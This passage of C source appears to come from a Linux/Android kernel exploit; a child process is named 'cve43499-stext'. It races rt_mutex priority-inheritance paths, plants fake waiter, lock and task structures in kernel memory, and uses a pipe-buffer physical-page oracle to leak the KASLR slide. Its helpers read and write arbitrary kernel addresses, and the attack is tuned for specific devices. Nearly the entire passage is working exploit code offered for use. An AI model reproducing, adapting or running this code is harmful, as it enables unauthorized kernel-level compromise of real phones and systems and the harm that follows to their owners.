  snprintf(delay_arg, sizeof(delay_arg), "%d", delay);
  SYSCHK(setenv("SLIDE_ENTER_DELAY_USEC", delay_arg, 1));
  pr_info("app fops slide route slot=%zu parent=%016zx target=%016zx "
          "lock=%016zx delay=%d fine_ticks=%llu\n",
          slot, slide_oracle_parent, slide_oracle_target, fake_lock, delay,
          (unsigned long long)slide_route_fine_delay_ticks);
  app_publish_writer_started();
#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
  /* A successful child result advances directly to the CFI stage without
   * another stdio write in between. */
  return slide_trigger_physical_state_report(0);
#else
  return slide_trigger_physical_state();
#endif
}

int app_trigger_fops_slide_route(void) {
#if defined(APP_FOPS_REUSE_VERIFIED_PAGE) && \
    APP_FOPS_REUSE_VERIFIED_PAGE
  return app_trigger_fops_slide_slot(P0_ORACLE_PRODUCTION_SLOT);
#else
  return app_trigger_fops_slide_slot(0);
#endif
}

#if (defined(APP_FOPS_ORACLE_DIAG_ONLY) && APP_FOPS_ORACLE_DIAG_ONLY) || \
    (defined(APP_FOPS_DATA_ALIAS_DIAG_ONLY) && \
     APP_FOPS_DATA_ALIAS_DIAG_ONLY)
int app_trigger_fops_oracle_slot(size_t slot) {
  return app_trigger_fops_slide_slot(slot);
}
#endif
#else
int app_trigger_fops_slide_route(void) {
  static size_t delay_index;
  static const int delays[] = {
    70000, 60000, 80000, 40000, 90000, 50000,
    30000, 20000, 75000, 65000, 85000, 55000,
  };
#if defined(APP_CLOSED_FOPS_ROUTE) && APP_CLOSED_FOPS_ROUTE
  slide_oracle_parent = fake_fops;
  slide_oracle_target = data_addr(ASHMEM_MISC_FOPS);
#else
  if (!select_slide_payload_index(0)) {
    return 0;
  }
#endif
  int delay = 0;
#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
  int forced_delay = slide_s928_fops_delay_override(&delay);
#else
  int forced_delay = 0;
#endif
#ifdef APP_FOPS_ROUTE_COARSE_DELAY_USEC
  if (!forced_delay) {
    delay = APP_FOPS_ROUTE_COARSE_DELAY_USEC;
  }
#elif defined(APP_FOPS_ROUTE_USE_PSELECT_DELAY) && \
    APP_FOPS_ROUTE_USE_PSELECT_DELAY
  const char *forced = forced_delay ? NULL : getenv("PSELECT_DELAY_USEC");
  if (forced && *forced) {
    char *end = NULL;
    errno = 0;
    long value = strtol(forced, &end, 0);
    if (!errno && end != forced && !*end && value >= 0 &&
        value <= 1000000) {
      delay = (int)value;
    }
  }
#endif
  if (!forced_delay && !delay) {
    delay = delays[delay_index % (sizeof(delays) / sizeof(delays[0]))];
  }
  if (!slide_override_route_coarse_delay(&delay)) {
    return 0;
  }
  delay_index++;
  slide_route_fine_delay_ticks = slide_select_route_fine_delay_ticks();
  if (slide_route_fine_delay_ticks == UINT64_MAX) {
    return 0;
  }
  char delay_arg[16];
  snprintf(delay_arg, sizeof(delay_arg), "%d", delay);
  SYSCHK(setenv("SLIDE_ENTER_DELAY_USEC", delay_arg, 1));
  pr_info("app fops slide route parent=%016zx target=%016zx lock=%016zx "
          "configured_delay=%d consume_delay=%u fine_ticks=%llu\n",
          slide_oracle_parent, slide_oracle_target, fake_lock, delay,
          (unsigned int)slide_enter_delay_usec(),
          (unsigned long long)slide_route_fine_delay_ticks);
  app_publish_writer_started();
#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
  /* Preserve the immediate successful-trigger to CFI handoff. */
  return slide_trigger_physical_state_report(0);
#else
  return slide_trigger_physical_state();
#endif
}
#endif

static int slide_leak_physical_base(void) {
  size_t started = gettime_ns();
#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
  uint64_t tracefs_base = 0;
  int tracefs_known = slide_tracefs_resolve_base(&tracefs_base);
  if (tracefs_known) {
    slide_p0_offset = (uintptr_t)(tracefs_base - KIMAGE_TEXT_BASE);
    pr_success("slide tracefs pre-oracle base=%016llx slide=%08zx\n",
               (unsigned long long)tracefs_base, slide_p0_offset);
#if defined(APP_TRACEFS_KASLR_DIRECT) && APP_TRACEFS_KASLR_DIRECT
    /* This target exposes a validated sched trace caller to the shell domain.
     * Treat it like the already-supported forced-offset path instead of
     * consuming a second PI-requeue race merely to confirm the same slide. */
    return slide_commit_stext(tracefs_base, "tracefs");
#endif
  } else {
    pr_warning("slide tracefs pre-oracle unavailable; using physical scan\n");
  }
#endif
  if (!prepare_p0_pipe_oracle()) {
    pr_error("p0 physical pipe preparation failed\n");
    return 0;
  }
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
#ifdef APP_SLIDE_FRESH_PAGE_ATTEMPTS
  const int fresh_page_attempts = APP_SLIDE_FRESH_PAGE_ATTEMPTS;
#else
  const int fresh_page_attempts = 1;
#endif
  int fresh_attempt = 1;
  int search_batch = 0;
#ifdef APP_SLIDE_KERNEL_PAGE_SEARCH_BATCHES
  const int max_search_batches = APP_SLIDE_KERNEL_PAGE_SEARCH_BATCHES;
#else
  const int max_search_batches = fresh_page_attempts;
#endif
  int refresh_oracle = 0;
  while (fresh_attempt <= fresh_page_attempts &&
         search_batch < max_search_batches) {
#if defined(APP_P0_REFRESH_ORACLE_EACH_FRESH_PAGE) && \
    APP_P0_REFRESH_ORACLE_EACH_FRESH_PAGE
    if (refresh_oracle) {
      reset_pipe_attempt();
      if (!prepare_p0_pipe_oracle()) {
        pr_error("p0 physical pipe refresh failed fresh=%d/%d\n",
                 fresh_attempt, fresh_page_attempts);
        return 0;
      }
      pr_info("p0 pipe oracle refreshed fresh=%d/%d base=%016zx\n",
              fresh_attempt, fresh_page_attempts, pipebuf_page_base);
      refresh_oracle = 0;
    }
#endif
    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
    search_batch++;
    pr_info("p0 page search batch=%d/%d gate_attempt=%d/%d base=%016zx\n",
            search_batch, max_search_batches, fresh_attempt,
            fresh_page_attempts, page_base);
    pr_info("p0 fresh page attempt=%d/%d base=%016zx\n",
            fresh_attempt, fresh_page_attempts, page_base);
    if (!page_base) {
#ifndef APP_SLIDE_KERNEL_PAGE_SEARCH_BATCHES
      fresh_attempt++;
      refresh_oracle = 1;
#endif
      continue;
    }
    if (!slide_trigger_physical_slot(P0_ORACLE_GATE_SLOT)) {
      pr_error("p0 physical pipe gate trigger failed fresh=%d/%d\n",
               fresh_attempt, fresh_page_attempts);
      fresh_attempt++;
      refresh_oracle = 1;
      continue;
    }
    int gate_result = verify_p0_pipe_oracle_gate();
    pr_info("p0 fresh page result=%d attempt=%d/%d\n",
            gate_result, fresh_attempt, fresh_page_attempts);
    if (getenv("P0_ORACLE_GATE_DIAG")) {
      pr_info("p0 physical gate diagnostic result=%d\n", gate_result);
      if (gate_result != 0) {
        slide_restore_physical_oracle();
      }
      return 0;
    }
    if (gate_result == 0) {
      pr_warning("p0 physical pipe reclaim miss fresh=%d/%d\n",
                 fresh_attempt, fresh_page_attempts);
      fresh_attempt++;
      refresh_oracle = 1;
      continue;
    }
    app_publish_p0_dirty();
    if (gate_result < 0) {
      pr_error("p0 physical pipe gate changed unexpected pages\n");
      slide_restore_physical_oracle();
      return 0;
    }
    if (!slide_trigger_physical_slot(P0_ORACLE_PROBE_SLOT)) {
      slide_restore_physical_oracle();
      return 0;
    }
    uintptr_t offset = scan_p0_pipe_oracle();
    if (offset == (uintptr_t)-1) {
      slide_restore_physical_oracle();
      return 0;
    }
#if defined(APP_P0_FINGERPRINT_INVERSE_SLIDE) && \
    APP_P0_FINGERPRINT_INVERSE_SLIDE
    if (offset > P0_ORACLE_PROBE_OFFSET) {
      pr_error("p0 fingerprint source offset exceeds probe source=%08zx "
               "probe=%08llx\n",
               offset, (unsigned long long)P0_ORACLE_PROBE_OFFSET);
      slide_restore_physical_oracle();
      return 0;
    }
    uintptr_t source_offset = offset;
    offset = P0_ORACLE_PROBE_OFFSET - source_offset;
    pr_info("p0 fingerprint inverse source_offset=%08zx probe=%08llx "
            "runtime_slide=%08zx\n",
            source_offset, (unsigned long long)P0_ORACLE_PROBE_OFFSET,
            offset);
#endif
    if (!slide_restore_physical_oracle()) {
      return 0;
    }
    slide_p0_session_fresh = 1;
    size_t elapsed_ms = (size_t)((gettime_ns() - started) / 1000000ULL);
    pr_success("p0 physical elapsed_ms=%zu fresh=%d/%d\n",
               elapsed_ms, fresh_attempt, fresh_page_attempts);
    return slide_commit_stext(KIMAGE_TEXT_BASE + offset, "physical");
  }
  return 0;
#else
  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
  if (!page_base) {
    return 0;
  }
  if (!slide_trigger_physical_slot(P0_ORACLE_GATE_SLOT)) {
    pr_error("p0 physical pipe gate trigger failed\n");
    return 0;
  }
  int gate_result = verify_p0_pipe_oracle_gate();
  if (getenv("P0_ORACLE_GATE_DIAG")) {
    pr_info("p0 physical gate diagnostic result=%d\n", gate_result);
    if (gate_result != 0) {
      slide_restore_physical_oracle();
    }
    return 0;
  }
  if (gate_result == 0) {
    pr_warning("p0 physical pipe reclaim miss\n");
    return 0;
  }
  app_publish_p0_dirty();
  if (gate_result < 0) {
    pr_error("p0 physical pipe gate changed unexpected pages\n");
    slide_restore_physical_oracle();
    return 0;
  }
  if (!slide_trigger_physical_slot(P0_ORACLE_PROBE_SLOT)) {
    slide_restore_physical_oracle();
    return 0;
  }
#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
  if (tracefs_known) {
    if (!slide_trigger_physical_slot(P0_ORACLE_GATE_RESTORE_SLOT)) {
      return 0;
    }
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
    slide_p0_session_fresh = 1;
#endif
    size_t elapsed_ms = (size_t)((gettime_ns() - started) / 1000000ULL);
    pr_success("p0 tracefs-assisted physical elapsed_ms=%zu slide=%08zx\n",
               elapsed_ms, slide_p0_offset);
    return slide_commit_stext(tracefs_base, "tracefs-physical");
  }
#endif
  uintptr_t offset = scan_p0_pipe_oracle();
  if (offset == (uintptr_t)-1) {
    slide_restore_physical_oracle();
    return 0;
  }
  if (!slide_restore_physical_oracle()) {
    return 0;
  }
  size_t elapsed_ms = (size_t)((gettime_ns() - started) / 1000000ULL);
  pr_success("p0 physical elapsed_ms=%zu\n", elapsed_ms);
  return slide_commit_stext(KIMAGE_TEXT_BASE + offset, "physical");
#endif
}

#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
static int slide_leak_virtual_base(uintptr_t physical_offset) {
  size_t started = gettime_ns();
  uint64_t ashmem_fops = 0;
  int gate_result = 0;
  int restore_needed = 0;
  int restore_ok = 0;
  int success = 0;
  slide_p0_offset = physical_offset;
  p0_virtual_base_probe = 1;

  if (!prepare_p0_pipe_oracle()) {
    pr_error("p0 virtual pipe preparation failed\n");
    goto out;
  }
  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
  if (!page_base) {
    goto out;
  }
  /* Any attempted rt_mutex write makes this supervisor attempt non-retryable. */
  app_publish_p0_dirty();
  if (!slide_trigger_physical_slot(P0_ORACLE_GATE_SLOT)) {
    pr_error("p0 virtual pipe gate trigger failed\n");
    goto out;
  }
  gate_result = verify_p0_pipe_oracle_gate();
  if (gate_result != 1) {
    pr_error("p0 virtual pipe reclaim gate=%d\n", gate_result);
    if (gate_result != 0) {
      restore_needed = 1;
    }
    goto out;
  }
  restore_needed = 1;
  if (!slide_trigger_physical_slot(P0_ORACLE_PROBE_SLOT)) {
    goto out;
  }
  ashmem_fops = scan_p0_virtual_base_pointer();

out:
  if (restore_needed) {
    restore_ok = slide_restore_physical_oracle();
  }
  p0_virtual_base_probe = 0;
  if (!restore_ok || ashmem_fops <= ASHMEM_FOPS_OFF) {
    return 0;
  }

  uint64_t base = ashmem_fops - ASHMEM_FOPS_OFF;
  if (base > UINT64_MAX - ASHMEM_FOPS_OFF ||
      base + ASHMEM_FOPS_OFF != ashmem_fops) {
    return 0;
  }
  size_t elapsed_ms = (size_t)((gettime_ns() - started) / 1000000ULL);
  pr_success("p0 virtual elapsed_ms=%zu ashmem_fops=%016llx "
             "base=%016llx\n", elapsed_ms,
             (unsigned long long)ashmem_fops,
             (unsigned long long)base);
  success = slide_commit_virtual_base(base, "physical-data");
  return success;
}
#endif

static void dump_p0_oracle_words(int fd, const char *phase,
                                 uintptr_t address, size_t count) {
  for (size_t index = 0; index < count; index++) {
    uintptr_t current = address + index * sizeof(uint64_t);
    uint64_t value = kernel_read64(fd, current);
    pr_info("p0 diagnostic %s addr=%016zx value=%016llx\n",
            phase, current, (unsigned long long)value);
  }
}

static int p0_diag_write32(int fd, uintptr_t address, uint32_t value) {
  return kernel_write_data(fd, address, &value, sizeof(value)) ==
         (ssize_t)sizeof(value);
}

static int p0_diag_write64(int fd, uintptr_t address, uint64_t value) {
  return kernel_write_data(fd, address, &value, sizeof(value)) ==
         (ssize_t)sizeof(value);
}

static int prepare_p0_diag_waiter(int fd, uintptr_t waiter,
                                  uintptr_t parent, uintptr_t target,
                                  uintptr_t task, uintptr_t lock) {
  if (!p0_diag_write64(fd, waiter + 0x00, 1) ||
      !p0_diag_write64(fd, waiter + 0x08, 0) ||
      !p0_diag_write64(fd, waiter + 0x10, 0)) {
    return 0;
  }
#if LEGACY_RT_MUTEX_WAITER || COMPACT_RT_MUTEX_WAITER
  return p0_diag_write64(fd, waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00,
                         parent) &&
         p0_diag_write64(fd, waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08,
                         0) &&
         p0_diag_write64(fd, waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10,
                         target) &&
         p0_diag_write64(fd, waiter + FAKE_WAITER_TASK_OFF, task) &&
         p0_diag_write64(fd, waiter + FAKE_WAITER_LOCK_OFF, lock) &&
#if COMPACT_RT_MUTEX_WAITER
         p0_diag_write32(fd, waiter + FAKE_WAITER_WAKE_STATE_OFF, 0) &&
#endif
         p0_diag_write32(fd, waiter + FAKE_WAITER_PRIO_OFF,
                         SLIDE_FAKE_WAITER_PRIO) &&
         p0_diag_write64(fd, waiter + FAKE_WAITER_DEADLINE_OFF, 0)
#if COMPACT_RT_MUTEX_WAITER
         && p0_diag_write64(fd, waiter + FAKE_WAITER_WW_CTX_OFF, 0)
#endif
         ;
#else
  return p0_diag_write32(fd, waiter + FAKE_WAITER_TREE_PRIO_OFF,
                         SLIDE_FAKE_WAITER_PRIO) &&
         p0_diag_write64(fd, waiter + FAKE_WAITER_TREE_DEADLINE_OFF, 0) &&
         p0_diag_write64(fd, waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00,
                         parent) &&
         p0_diag_write64(fd, waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08,
                         0) &&
         p0_diag_write64(fd, waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10,
                         target) &&
         p0_diag_write32(fd, waiter + FAKE_WAITER_PI_TREE_PRIO_OFF,
                         SLIDE_FAKE_WAITER_PRIO) &&
         p0_diag_write64(fd, waiter + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0) &&
         p0_diag_write64(fd, waiter + FAKE_WAITER_TASK_OFF, task) &&
         p0_diag_write64(fd, waiter + FAKE_WAITER_LOCK_OFF, lock) &&
         p0_diag_write32(fd, waiter + FAKE_WAITER_WAKE_STATE_OFF, 0) &&
         p0_diag_write64(fd, waiter + FAKE_WAITER_WW_CTX_OFF, 0);
#endif
}

static int prepare_p0_diag_gate_payload(int fd, uintptr_t payload_base) {
  uintptr_t task = payload_base + SLIDE_BANK_TASK_OFF;
  uintptr_t lock = payload_base + SLIDE_BANK_LOCK_OFF;
  uintptr_t waiter = lock + SLIDE_BANK_WAITER_OFF;
  uintptr_t parent = direct_to_page(payload_base);
  uintptr_t target = pipebuf_page_base +
                     P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE;
  static const char marker[] = "RMG-P0-ORACLE-GATE";
  uintptr_t marker_address = payload_base + P0_ORACLE_GATE_PAGE_OFF;
  if (getenv("P0_ORACLE_READ_DIAG")) {
    marker_address = payload_base;
  }

  if (kernel_write_data(fd, marker_address, marker, sizeof(marker) - 1) !=
          (ssize_t)(sizeof(marker) - 1) ||
      !p0_diag_write32(fd, lock + 0x00, 0) ||
      !p0_diag_write64(fd, lock + 0x08, waiter) ||
      !p0_diag_write64(fd, lock + 0x10, waiter) ||
      !p0_diag_write64(fd, lock + 0x18, SLIDE_LOCK_OWNER_VALUE) ||
      !prepare_p0_diag_waiter(fd, waiter, parent, target, task, lock) ||
      !p0_diag_write32(fd, task + FAKE_TASK_USAGE_OFF, 0x100) ||
      !p0_diag_write32(fd, task + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO) ||
      !p0_diag_write32(fd, task + FAKE_TASK_NORMAL_PRIO_OFF,
                       FAKE_TASK_PRIO) ||
      !p0_diag_write64(fd, task + FAKE_TASK_TASK_GROUP_OFF, 0) ||
      !p0_diag_write32(fd, task + FAKE_TASK_PI_LOCK_OFF, 0) ||
      !p0_diag_write64(fd, task + FAKE_TASK_PI_WAITERS_OFF,
                       waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF) ||
      !p0_diag_write64(fd, task + FAKE_TASK_PI_WAITERS_OFF + 0x08,
                       waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF) ||
      !p0_diag_write64(fd, task + FAKE_TASK_PI_TOP_TASK_OFF, task) ||
      !p0_diag_write64(fd, task + FAKE_TASK_PI_BLOCKED_ON_OFF, 0)) {
    return 0;
  }

  fake_task = task;
  fake_lock = lock;
  fake_w0 = waiter;
  slide_oracle_parent = parent;
  slide_oracle_target = target;
  return 1;
}

int run_p0_pipe_oracle_diagnostic(int fd) {
  uintptr_t fops_page_base = page_base;
  if (!prepare_p0_pipe_oracle() ||
      !prepare_p0_diag_gate_payload(fd, fops_page_base)) {
    pr_error("p0 diagnostic preparation failed pipe=%016zx fops=%016zx\n",
             pipebuf_page_base, fops_page_base);
    return 0;
  }

  uintptr_t target_start = slide_oracle_target - 0x20;
  uintptr_t parent_start = slide_oracle_parent;
  uint64_t original_target = kernel_read64(fd, slide_oracle_target);
  pr_info("p0 diagnostic prepared pipe=%016zx source=%016zx parent=%016zx "
          "target=%016zx original=%016llx\n",
          pipebuf_page_base, fops_page_base, slide_oracle_parent,
          slide_oracle_target, (unsigned long long)original_target);
  dump_p0_oracle_words(fd, "target-before", target_start, 20);
  dump_p0_oracle_words(fd, "parent-before", parent_start, 8);
  if (!slide_trigger_physical_state()) {
    pr_error("p0 diagnostic gate trigger failed\n");
    return 0;
  }
  dump_p0_oracle_words(fd, "target-after", target_start, 20);
  dump_p0_oracle_words(fd, "parent-after", parent_start, 8);
  uint64_t changed_target = kernel_read64(fd, slide_oracle_target);
  if (getenv("P0_ORACLE_READ_DIAG")) {
    int gate_ok = verify_p0_pipe_oracle_gate();
    pr_info("p0 diagnostic pipe read gate=%d\n", gate_ok);
    fflush(NULL);
    for (;;) {
      sleep(60);
    }
  }
  int restore_ok = p0_diag_write64(fd, slide_oracle_target, original_target);
  uint64_t restored_target = kernel_read64(fd, slide_oracle_target);
  pr_info("p0 diagnostic gate complete expected=%016zx changed=%016llx "
          "restore=%d restored=%016llx\n",
          slide_oracle_parent, (unsigned long long)changed_target,
          restore_ok, (unsigned long long)restored_target);
  return restore_ok && restored_target == original_target;
}
#endif

static int slide_commit_stext(uint64_t stext, const char *source) {
  if (stext < KIMAGE_TEXT_BASE) {
    return 0;
  }
  uint64_t slide = stext - KIMAGE_TEXT_BASE;
  if (slide > slide_max_offset || (slide & 0x7fffULL) != 0) {
    pr_warning("slide rejected source=%s stext=%016llx slide=%016llx\n",
               source, (unsigned long long)stext,
               (unsigned long long)slide);
    return 0;
  }
  if (strcmp(source, "pselect") == 0 && slide != slide_p0_offset) {
    pr_warning("slide stale boot_id candidate=%08zx leaked_slide=%08llx\n",
               slide_p0_offset, (unsigned long long)slide);
    return 0;
  }
  kaslr_base = stext;
  kaslr_slide = slide;
  slide_p0_offset = slide;
  kaslr_done = 1;
  data_addr_canonical = strcmp(source, "tracefs") == 0;
  if (data_addr_canonical) {
    app_publish_slide_ready();
  } else {
    app_publish_p0_offset(slide_p0_offset);
  }
  pr_success("slide-kaslr-ok source=%s pid=%d base=%016llx "
             "slide=%016llx data_mode=%s\n",
             source, getpid(), (unsigned long long)kaslr_base,
             (unsigned long long)kaslr_slide,
             data_addr_canonical ? "canonical" : "physical-alias");
  return 1;
}



int slide_leak_kernel_base(void) {
#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
  const char *forced_offset_arg = getenv("SLIDE_P0_OFFSET");
  if (forced_offset_arg && *forced_offset_arg) {
    char *end = NULL;
    errno = 0;
    unsigned long long value = strtoull(forced_offset_arg, &end, 0);
    if (errno || end == forced_offset_arg || *end || value > 0x1f0000ULL ||
        (value & 0xffffULL) != 0) {
      pr_error("slide invalid forced p0 offset=%s\n", forced_offset_arg);
      return 0;
    }
    const char *gate_page_arg = getenv("P0_GATE_PAGE_STRUCT");
    const char *probe_page_arg = getenv("P0_PROBE_PAGE_STRUCT");
    if (gate_page_arg && probe_page_arg) {
      char *gate_end = NULL;
      char *probe_end = NULL;
      errno = 0;
      p0_gate_page_struct = (uintptr_t)strtoull(
          gate_page_arg, &gate_end, 0);
      p0_probe_page_struct = (uintptr_t)strtoull(
          probe_page_arg, &probe_end, 0);
      if (errno || gate_end == gate_page_arg || *gate_end ||
          probe_end == probe_page_arg || *probe_end) {
        pr_error("slide invalid p0 restore pages gate=%s probe=%s\n",
                 gate_page_arg, probe_page_arg);
        return 0;
      }
    }
    pr_info("slide forced p0 offset=%08llx\n", value);
#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
    const char *virtual_base_arg = getenv("SLIDE_VIRTUAL_BASE");
    if (virtual_base_arg && *virtual_base_arg) {
      char *base_end = NULL;
      errno = 0;
      unsigned long long virtual_base =
          strtoull(virtual_base_arg, &base_end, 0);
      slide_p0_offset = (uintptr_t)value;
      if (errno || base_end == virtual_base_arg || *base_end ||
          !slide_commit_virtual_base(virtual_base, "forced-virtual")) {
        pr_error("slide invalid forced virtual base=%s\n", virtual_base_arg);
        return 0;
      }
      return 1;
    }
    return slide_leak_virtual_base((uintptr_t)value);
#else
    return slide_commit_stext(KIMAGE_TEXT_BASE + value, "forced");
#endif
  }
  const char *slide_source = getenv("SLIDE_SOURCE");
  int force_p0 = slide_source && strcmp(slide_source, "p0") == 0;
#if defined(APP_TRACEFS_SLIDE) && APP_TRACEFS_SLIDE
  int force_tracefs = slide_source && strcmp(slide_source, "tracefs") == 0;
  if (slide_source && *slide_source && !force_p0 && !force_tracefs &&
      strcmp(slide_source, "auto") != 0) {
    pr_error("slide unknown source=%s (use auto, tracefs, or p0)\n",
             slide_source);
    return 0;
  }
  pr_info("slide source mode=%s\n",
          slide_source && *slide_source ? slide_source : "auto");
  if (!force_p0) {
    if (slide_tracefs_leak_kernel_base()) {
      return 1;
    }
    if (force_tracefs) {
      return 0;
    }
    pr_warning("slide tracefs failed; falling back to physical P0\n");
  }
  return slide_leak_physical_base();
#else
  if (slide_source && *slide_source && !force_p0 &&
      strcmp(slide_source, "auto") != 0) {
    pr_error("slide unknown source=%s (use p0 or auto)\n", slide_source);
    return 0;
  }
  pr_info("slide source mode=p0\n");
  return slide_leak_physical_base();
#endif
#else
  const char *forced_offset_arg = getenv("SLIDE_P0_OFFSET");
  uintptr_t forced_offset = 0;
  int forced = forced_offset_arg && *forced_offset_arg;
  if (forced) {
    char *end = NULL;
    errno = 0;
    unsigned long long value = strtoull(forced_offset_arg, &end, 0);
    if (errno || end == forced_offset_arg || *end || value > 0x1f0000ULL ||
        (value & 0xffffULL) != 0) {
      pr_error("slide invalid forced p0 offset=%s\n", forced_offset_arg);
      return 0;
    }
    forced_offset = (uintptr_t)value;
    pr_info("slide forced p0 offset=%08zx\n", forced_offset);
    return slide_commit_stext(
        KIMAGE_TEXT_BASE + forced_offset, "forced");
  }

  uint64_t existing_stext = slide_read_stext();
  if (existing_stext && slide_commit_stext(existing_stext, "boot_id")) {
    return 1;
  }

  int max_attempts = forced ? 1 : SLIDE_MAX_ATTEMPTS;
#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
    defined(SLIDE_P0_OFFSET_CANDIDATES)
  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
  if (!page_base) {
    return 0;
  }
#endif
  for (int attempt = 1; attempt <= max_attempts; attempt++) {
    if (forced) {
      slide_p0_offset = forced_offset;
    } else {
#ifdef SLIDE_P0_OFFSET_CANDIDATES
      slide_p0_offset = slide_p0_offsets[
          (size_t)(attempt - 1) %
          (sizeof(slide_p0_offsets) / sizeof(slide_p0_offsets[0]))];
#else
      slide_p0_offset = 0;
#endif
    }
    pr_info("slide attempt %d/%d p0_offset=%08zx logger_parent=%016llx "
            "bootid_target=%016llx\n",
            attempt, max_attempts, slide_p0_offset,
            (unsigned long long)(SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset),
            (unsigned long long)(
                SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + slide_p0_offset));
#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
    defined(SLIDE_P0_OFFSET_CANDIDATES)
    if (!select_slide_payload_slot(slide_p0_offset)) {
      pr_error("slide payload slot missing p0_offset=%08zx\n",
               slide_p0_offset);
      return 0;
    }
#else
    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
    if (!page_base || !fake_lock) {
      continue;
    }
#endif

    int raw_fds[2];
    SYSCHK(pipe(raw_fds));
    int fds[2];
#ifndef SLIDE_PSELECT_NFDS
#define SLIDE_PSELECT_NFDS 320
#endif
    fds[0] = SYSCHK(fcntl(raw_fds[0], F_DUPFD, SLIDE_PSELECT_NFDS + 128));
    fds[1] = SYSCHK(fcntl(raw_fds[1], F_DUPFD, SLIDE_PSELECT_NFDS + 129));
    SYSCHK(close(raw_fds[0]));
    SYSCHK(close(raw_fds[1]));

    pid_t child = SYSCHK(fork());
    if (child == 0) {
      SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
      if (getppid() == 1) {
        _exit(1);
      }
      syscall(SYS_prctl, PR_SET_NAME, "cve43499-stext", 0, 0, 0);
      SYSCHK(close(fds[0]));
      disable_rseq_for_thread();
      slide_log_child_context();
      uint64_t stext = slide_child_leak_stext();
      if (stext) {
        SYSCHK(write(fds[1], &stext, sizeof(stext)));
        _exit(0);
      }
      _exit(1);
    }

    SYSCHK(close(fds[1]));
    uint64_t stext = 0;
    ssize_t n = read(fds[0], &stext, sizeof(stext));
    SYSCHK(close(fds[0]));
    int status = 0;
    SYSCHK(waitpid(child, &status, 0));
    if (n != (ssize_t)sizeof(stext) || !WIFEXITED(status) ||
        WEXITSTATUS(status) != 0 || !stext) {
      pr_warning("slide attempt %d failed n=%zd status=%d\n",
                 attempt, n, status);
      continue;
    }

    if (slide_commit_stext(stext, "pselect")) {
      return 1;
    }
  }

  return 0;
#endif
}
